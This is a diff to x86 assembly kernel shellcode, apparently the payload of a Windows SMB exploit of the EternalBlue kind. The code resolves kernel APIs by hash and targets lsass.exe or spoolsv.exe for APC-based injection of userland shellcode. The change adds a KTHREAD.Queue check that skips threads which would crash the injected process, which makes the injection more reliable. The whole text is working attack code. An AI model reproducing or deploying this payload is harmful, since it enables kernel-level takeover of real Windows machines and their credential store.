@@ -29,6 +29,7 @@ PSGETPROCESSIMAGEFILENAME_HASH    EQU    0x77645f3f
 LSASS_EXE_HASH    EQU    0xc1fa6a5a
 SPOOLSV_EXE_HASH    EQU    0x3ee083d8
 ZWALLOCATEVIRTUALMEMORY_HASH    EQU    0x576e99ea
+PSGETTHREADTEB_HASH    EQU    0xcef84c3e
 KEINITIALIZEAPC_HASH    EQU    0x6d195cc4
 KEINSERTQUEUEAPC_HASH    EQU    0xafcc4634
 PSGETPROCESSPEB_HASH    EQU    0xb818b848
@@ -288,11 +289,33 @@ found_target_process:
     ; try queueing APC then check KAPC member is more reliable.
 
 _insert_queue_apc_loop:
-    ; TODO: do not try to queue APC if TEB.ActivationContextStackPointer is NULL
-    ; if TEB.ActivationContextStackPointer is NULL, system will be reboot after inserting APC to queue
     ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front
     mov ebx, [ebx+4]
     ; no check list head
+    
+    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.
+    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.
+    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.
+    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.
+    ; Teb member is next to Queue member.
+    mov eax, PSGETTHREADTEB_HASH
+    call get_proc_addr
+    mov eax, dword [eax+0xa]    ; get offset from code (offset of Teb is always > 0x7f)
+%ifdef WIN7
+    sub eax, edi
+    cmp dword [ebx+eax-12], 0   ; KTHREAD.Queue MUST not be NULL
+%elifdef WIN8
+    sub eax, edi
+    cmp dword [ebx+eax-4], 0    ; KTHREAD.Queue MUST not be NULL
+%else
+    cmp al, 0xa0                ; win8+ offset is 0xa8
+    ja _kthread_queue_check
+    sub al, 8                   ; late 5.2 to 6.1, displacement is 0xc
+_kthread_queue_check:
+    sub eax, edi
+    cmp dword [ebx+eax-4], 0    ; KTHREAD.Queue MUST not be NULL
+%endif
+    je _insert_queue_apc_loop
     
     ; KeInitializeApc(PKAPC,
     ;                 PKTHREAD,
